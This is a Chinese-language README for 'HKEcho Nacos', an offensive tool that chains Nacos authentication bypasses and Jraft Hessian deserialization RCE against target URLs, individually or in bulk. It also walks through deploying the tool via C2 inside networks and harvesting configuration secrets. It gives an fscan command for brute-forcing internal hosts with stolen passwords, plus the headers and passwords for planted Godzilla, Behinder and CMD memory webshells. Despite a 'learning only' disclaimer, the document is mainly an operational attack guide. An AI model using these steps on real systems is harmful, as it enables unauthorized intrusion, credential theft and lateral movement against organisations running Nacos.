# HKEcho Nacos快速利用工具 v0.1

注意：工具仅供学习使用，请勿滥用，否则后果自负！

```
        ~~||HKEcho Nacos快速利用工具||~~
                【*】Author：HKEcho

<*哥斯拉内存马*>
密码:pass/key
设置请求头:x-client-data:godzilla;
设置Referer:https://www.google.com/
```

工具文件夹中HKEcho_Nacos.exe，nacosleak.exe均已通过upx压缩加壳减小体积。担心后门可自行编译或前往原项目地址下载。

## 原理

本工具支持检测以下漏洞：

```
0、未授权查看用户列表

以下漏洞顺序执行直到获取到一个账号：
1、检测nacos默认口令
2、任意用户添加
3、任意用户添加UA_Bypass
4、任意用户添加末尾斜杠绕过
5、默认JWT任意用户添加
6、JWT_Secret_Key硬编码绕过
7、Identity硬编码绕过
8、QVD-2023-6271身份认证绕过
一旦某个漏洞获取账号密码后，会调用a1phaboy师傅写的nacosleak读取配置文件

9、Nacos_Jraft_Hessian反序列化漏洞
程序会调用c0olw师傅写的NacosRce打一遍Jraft_Hessian反序列化漏洞（本工具在调用这个NacosRce工具前会判断Java环境，若不存在，则告警不执行）
```

## 安装

```
pip install -r requirements.txt
```

## 食用

```
HKEcho_Nacos>python HKEcho_Nacos.py -h
* * * * * * * * * * * * * * * * * * * * * * * *
        ~~||HKEcho Nacos快速利用工具||~~
                【*】Author：HKEcho

<*哥斯拉内存马*>
密码:pass/key
设置请求头:x-client-data:godzilla;
设置Referer:https://www.google.com/
* * * * * * * * * * * * * * * * * * * * * * * *
usage: HKEcho_Nacos.py [-h] [-u URL] [-f FILENAME]

optional arguments:
  -h, --help   show this help message and exit
  -u URL       要检查漏洞的单个URL:http://127.0.0.1:8848
  -f FILENAME  批量检测,包含URL的文本文件
```

**1、单个目标检测：**

```
python HKEcho_Nacos.py -u http://192.2xx.2xx.1x:8848
```

![image-20231114180219893](.\images\image-20231114180219893.png)

**2、批量目标检测**：

新建txt文件，一行放一个Nacos的URL

```
python HKEcho_Nacos.py -f target.txt
```

![image-20231114191212752](.\images\image-20231114191212752.png)

**3、特殊场景下使用**

注意：HKEcho_Nacos.exe命令行界面在win11下图形加载正常，其余系统可能存在显示问题，不影响程序使用

上传python打包的HKEcho_Nacos.exe到C2上使用，注意，单纯上传HKEcho_Nacos.exe运行，会对内网目标nacos添加一个账号，不会对目标进行配置文件导出和检测Nacos_Jraft_Hessian反序列化漏洞。若想导出配置文件，可单独上传nacosleak.exe进行读取。

![image-20231115095419466](.\images\image-20231115095419466.png)

![image-20231115095310757](.\images\image-20231115095310757.png)

或者如下图直接将HKEcho_Nacos.exe与nacosleak.exe通过C2上传到目标服务器上同一目录下，直接执行HKEcho_Nacos.exe会自动调用nacosleak.exe

![image-20231115095608455](.\images\image-20231115095608455.png)

同理，若想检测检测Nacos_Jraft_Hessian反序列化漏洞，同理可以将NacosRce压缩后上传到目标服务器上同一目录下，不过不建议这样，NacosRce太大了。

![image-20231115100233567](.\images\image-20231115100233567.png)

## Nacos后利用

### Nacos配置文件

上述利用完成后，会在/results/ip_port/public目录下生成目标站点的配置文件，a1phaboy师傅特别将ak/sk,password关键字提取了出来：

![image-20231114183758207](.\images\image-20231114183758207.png)

我们可以在内网可以通过该密码本快速爆破，比如利用fscan等工具

```
fscan.exe -h 192.168.1.1/24 -o 192.168.1.txt -pwda 收集到的新密码 -usera 收集到的新用户
```

### Nacos Hessian 反序列化漏洞

一、冰蝎内存马：

```
1、需要设置请求头x-client-data:rebeyond
2、设置Referer:https://www.google.com/
3、路径随意
4、密码rebeyond
```

二、哥斯拉内存马：

```
1、需要设置请求头x-client-data:godzilla
2、设置Referer:https://www.google.com/
3、路径随意
4、密码是pass 和 key
```

三、CMD内存马：

```
1、需要设置请求头x-client-data:cmd
2、设置Referer:https://www.google.com/
3、请求头cmd:要执行的命令
```

#### **后渗透**

后渗透利用pap1rman师傅的哥斯拉nacos后渗透插件-postnacos

MakeToken

![250575224-7819b38c-e558-49b0-bce7-dd6d9b5a185b](.\images\250575224-7819b38c-e558-49b0-bce7-dd6d9b5a185b.png)

将生成后的token 保存进浏览器cookie 格式 token:{xxx}

![250532141-60089b8d-fa3d-4584-bc16-90dc5423d486](.\images\250532141-60089b8d-fa3d-4584-bc16-90dc5423d486.png)

**Adduser**

![250532121-2a110b94-4ff7-4c09-a456-6d090f10ac3f](.\images\250532121-2a110b94-4ff7-4c09-a456-6d090f10ac3f.png)

添加一个账号后，用nacosleak单独把配置文件读取下来。

```
nacosleak.exe -t http://192.2xx.2xx.21:8848 -u audit2 -p Password123!
```

## 测试环境

在github下载有漏洞的版本
https://github.com/alibaba/nacos/releases

![image-20231115102526342](.\images\image-20231115102526342.png)

![image-20231115102620390](.\images\image-20231115102620390.png)

## 参考链接

致谢：

https://github.com/Pizz33/nacos_vul

https://github.com/c0olw/NacosRce

https://github.com/pap1rman/postnacos
